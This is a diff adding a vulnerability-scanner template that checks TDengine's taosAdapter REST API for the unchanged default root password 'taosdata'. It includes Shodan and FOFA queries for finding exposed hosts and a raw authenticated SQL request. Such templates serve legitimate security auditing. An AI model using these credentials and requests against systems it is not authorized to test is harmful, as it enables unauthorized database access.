@@ -1,0 +1,69 @@
+id: tdengine-default-login
+
+info:
+  name: TDengine taosAdapter - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    TDengine contains a default login caused by the built-in root superuser keeping the password taosdata until it is changed, letting remote attackers authenticate to the taosAdapter REST API and run arbitrary SQL against every database.
+  reference:
+    - https://docs.tdengine.com/tdengine-reference/client-libraries/rest-api/
+    - https://docs.tdengine.com/security-guide/user/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: tdengine
+    product: tdengine
+    shodan-query: http.html:"no auth info input"
+    fofa-query: body="no auth info input" || title="TDengine"
+  tags: tdengine,default-login
+
+variables:
+  username: "root"
+  password: "taosdata"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /rest/sql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+
+        SHOW DATABASES
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'regex("\"code\"\\s*:\\s*4357", body)'
+          - 'contains(body, "no auth info input")'
+          - 'contains(content_type, "json")'
+          - 'status_code == 401'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /rest/sql HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64(username + ":" + password)}}
+        Content-Type: text/plain
+
+        SHOW DATABASES
+
+    host-redirects: true
+    max-redirects: 2
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'regex("\"code\"\\s*:\\s*0\\s*,", body)'
+          - 'contains_all(body, "\"column_meta\"", "\"data\"")'
+          - 'contains(content_type, "json")'
+          - 'status_code == 200'
+        condition: and
